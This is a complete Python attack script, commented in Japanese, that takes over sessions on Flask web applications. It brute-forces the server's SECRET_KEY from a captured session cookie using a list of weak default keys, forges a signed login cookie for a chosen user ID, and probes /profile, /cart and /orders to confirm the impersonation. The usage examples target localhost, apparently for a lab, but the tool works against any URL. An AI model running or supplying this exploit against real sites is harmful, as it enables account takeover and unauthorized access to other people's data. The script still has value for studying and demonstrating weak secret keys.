#!/usr/bin/env python3
"""
セッションハイジャックツール
指定したWEBサーバーに対してセッションハイジャックを実行し、
SECRET_KEYを辞書攻撃で見つけます。
"""

import requests
import json
from itsdangerous import URLSafeTimedSerializer, BadSignature, SignatureExpired
import sys
import argparse
from concurrent.futures import ThreadPoolExecutor, as_completed


class SessionHijacker:
    def __init__(self, target_url, wordlist_path=None):
        self.target_url = target_url.rstrip('/')
        self.session = requests.Session()
        self.wordlist_path = wordlist_path
        self.found_secret_key = None
        
    def load_wordlist(self, wordlist_path):
        """辞書ファイルを読み込む"""
        try:
            with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
                return [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print(f"[!] 辞書ファイルが見つかりません: {wordlist_path}")
            return []
        except Exception as e:
            print(f"[!] 辞書ファイルの読み込みエラー: {e}")
            return []
    
    def get_default_wordlist(self):
        """デフォルトのSECRET_KEY候補リスト"""
        return [
            "secret",
            "SECRET",
            "secretkey",
            "SECRET_KEY",
            "flask-secret-key",
            "django-secret-key",
            "development-secret-key",
            "production-secret-key",
            "changeme",
            "change-me",
            "default-secret-key",
            "your-secret-key-here",
            "1234567890",
            "abcdefghijklmnopqrstuvwxyz",
            "admin",
            "password",
            "root",
            "test",
            "testing",
            "dev",
            "development",
            "prod",
            "production",
            "key",
            "secret123",
            "mysecretkey",
            "supersecret",
            "verysecret",
            "dev-secret-key",
            "ultrasecret",
        ]
    
    def get_session_cookie(self, url):
        """セッションクッキーを取得"""
        try:
            response = self.session.get(url, timeout=10)
            cookies = self.session.cookies
            
            # Flaskのセッションクッキー（通常は'session'という名前）
            session_cookies = {}
            for cookie in cookies:
                if 'session' in cookie.name.lower():
                    session_cookies[cookie.name] = cookie.value
            
            if not session_cookies:
                # すべてのクッキーを返す
                session_cookies = {cookie.name: cookie.value for cookie in cookies}
            
            return session_cookies, response
        except Exception as e:
            print(f"[!] セッションクッキーの取得エラー: {e}")
            return {}, None
    
    def decode_flask_session(self, session_cookie, secret_key):
        """Flaskのセッションクッキーを復号"""
        try:
            serializer = URLSafeTimedSerializer(secret_key)
            data = serializer.loads(session_cookie, max_age=None)
            return data
        except (BadSignature, SignatureExpired, Exception) as e:
            return None
    
    def encode_flask_session(self, data, secret_key):
        """Flaskのセッションクッキーをエンコード"""
        try:
            serializer = URLSafeTimedSerializer(secret_key)
            return serializer.dumps(data)
        except Exception as e:
            print(f"[!] セッションクッキーのエンコードエラー: {e}")
            return None
    
    def test_secret_key(self, secret_key, session_cookie):
        """SECRET_KEYが正しいかテスト"""
        decoded = self.decode_flask_session(session_cookie, secret_key)
        return decoded is not None
    
    def dictionary_attack(self, session_cookie, max_workers=10):
        """辞書攻撃でSECRET_KEYを見つける"""
        print(f"[*] SECRET_KEYの辞書攻撃を開始...")
        print(f"[*] テスト対象のセッションクッキー: {session_cookie[:50]}...")
        
        # 辞書リストを取得
        if self.wordlist_path:
            wordlist = self.load_wordlist(self.wordlist_path)
            if not wordlist:
                print("[!] 辞書ファイルが空です。デフォルトリストを使用します。")
                wordlist = self.get_default_wordlist()
        else:
            wordlist = self.get_default_wordlist()
        
        print(f"[*] {len(wordlist)}個の候補をテストします...")
        
        # マルチスレッドで辞書攻撃を実行
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = {
                executor.submit(self.test_secret_key, key, session_cookie): key
                for key in wordlist
            }
            
            for future in as_completed(futures):
                key = futures[future]
                try:
                    if future.result():
                        self.found_secret_key = key
                        print(f"\n[+] SECRET_KEYが見つかりました: {key}")
                        return key
                except Exception as e:
                    continue
        
        print("\n[!] SECRET_KEYが見つかりませんでした。")
        return None
    
    def create_fake_session(self, secret_key, target_user_id):
        """偽造するセッションデータを作成"""
        fake_session = {
            "_user_id": str(target_user_id),
            "_fresh": True,
            "_id": str(target_user_id)
        }
        return fake_session
    
    def test_endpoint(self, session, base_url, endpoint):
        """エンドポイントにアクセスしてテスト"""
        url = f"{base_url}{endpoint}"
        try:
            response = session.get(url, timeout=10)
            print(f"ステータスコード: {response.status_code}")
            return response
        except Exception as e:
            print(f"[!] リクエストエラー: {e}")
            return None
    
    def hijack_session(self, target_user_id=None, target_username=None, endpoints=None):
        """セッションハイジャックを実行"""
        print(f"[*] ターゲットURL: {self.target_url}")
        
        # デフォルトのエンドポイントリスト
        if endpoints is None:
            endpoints = ['/profile', '/cart', '/orders']
        
        # ターゲットユーザーIDが指定されていない場合は1を使用
        if target_user_id is None:
            target_user_id = "1"
        else:
            target_user_id = str(target_user_id)
        
        print(f"[*] 攻撃対象のユーザーID: {target_user_id}")
        
        # セッションクッキーを取得（辞書攻撃用）
        print("[*] セッションクッキーを取得中...")
        session_cookies, response = self.get_session_cookie(self.target_url)
        
        secret_key = None
        
        # セッションクッキーが存在する場合は辞書攻撃を実行
        if session_cookies:
            print(f"[+] セッションクッキーを取得: {list(session_cookies.keys())}")
            cookie_name = list(session_cookies.keys())[0]
            session_cookie = session_cookies[cookie_name]
            
            # SECRET_KEYを辞書攻撃で見つける
            secret_key = self.dictionary_attack(session_cookie)
            
            if secret_key:
                # セッションクッキーを復号して確認
                print("[*] セッションクッキーを復号中...")
                session_data = self.decode_flask_session(session_cookie, secret_key)
                if session_data:
                    print(f"[+] セッションデータ: {json.dumps(session_data, indent=2, ensure_ascii=False)}")
        else:
            print("[!] セッションクッキーが見つかりませんでした。")
            print("[*] デフォルトのSECRET_KEYを使用してセッションを偽造します...")
            # デフォルトのSECRET_KEYを試す
            default_key = "dev-secret-key"
            secret_key = default_key
        
        if not secret_key:
            print("[!] SECRET_KEYが見つからないため、セッションハイジャックを続行できません。")
            return False
        
        print(f"[+] 使用するSECRET_KEY: {secret_key}")
        
        # 偽造するセッションデータを作成
        print("[*] 偽造するセッションデータを作成中...")
        fake_session = self.create_fake_session(secret_key, target_user_id)
        print(f"[+] 偽造セッションデータ: {json.dumps(fake_session, indent=2, ensure_ascii=False)}")
        
        # セッションクッキーを生成
        print("[*] 偽造したセッションクッキーを生成中...")
        fake_cookie = self.encode_flask_session(fake_session, secret_key)
        
        if not fake_cookie:
            print("[!] セッションクッキーの生成に失敗しました。")
            return False
        
        print(f"[*] 偽造したセッションクッキー: {fake_cookie}")
        
        # 偽造したセッションでアクセス
        hijacked_session = requests.Session()
        hijacked_session.cookies.set('session', fake_cookie)
        
        success_count = 0
        
        # 各エンドポイントにアクセス
        for endpoint in endpoints:
            print(f"\n[*] {endpoint}にアクセス...")
            response = self.test_endpoint(hijacked_session, self.target_url, endpoint)
            
            if response and response.status_code == 200:
                print(f"[!] 攻撃成功: {endpoint}にアクセスできました")
                if "プロフィール" in response.text or "profile" in response.text.lower():
                    print("[!] ユーザーになりすましてアクセスできました")
                success_count += 1
            else:
                print(f"[*] 攻撃失敗: {endpoint}への認証が必要です")
        
        # メインページにもアクセス
        print(f"\n[*] メインページにアクセス...")
        response = self.test_endpoint(hijacked_session, self.target_url, '')
        
        if response and response.status_code == 200:
            print("[+] セッションハイジャックが成功しました！")
            return True
        elif success_count > 0:
            print(f"[+] {success_count}個のエンドポイントへのアクセスに成功しました！")
            return True
        else:
            print("[!] セッションハイジャックが失敗しました")
            return False


def main():
    parser = argparse.ArgumentParser(
        description='WEBサーバーに対するセッションハイジャックツール',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
使用例:
  python 001session_hijack.py -u http://localhost:5000
  python 001session_hijack.py -u http://localhost:5000 --user-id 1
  python 001session_hijack.py -u http://localhost:5000 -w wordlist.txt
  python 001session_hijack.py -u http://localhost:5000 --endpoints /profile /cart /orders
        """
    )
    
    parser.add_argument('-u', '--url', required=True,
                       help='ターゲットURL')
    parser.add_argument('-w', '--wordlist',
                       help='SECRET_KEYの辞書ファイルパス')
    parser.add_argument('--user-id',
                       help='ハイジャックするユーザーID（デフォルト: 1）')
    parser.add_argument('--endpoints', nargs='+',
                       default=['/profile', '/cart', '/orders'],
                       help='テストするエンドポイント（デフォルト: /profile /cart /orders）')
    parser.add_argument('--threads', type=int, default=10,
                       help='辞書攻撃のスレッド数（デフォルト: 10）')
    
    args = parser.parse_args()
    
    hijacker = SessionHijacker(args.url, args.wordlist)
    success = hijacker.hijack_session(
        target_user_id=args.user_id,
        endpoints=args.endpoints
    )
    
    if success:
        print("\n[+] セッションハイジャックが完了しました。")
        sys.exit(0)
    else:
        print("\n[!] セッションハイジャックに失敗しました。")
        sys.exit(1)


if __name__ == '__main__':
    main()

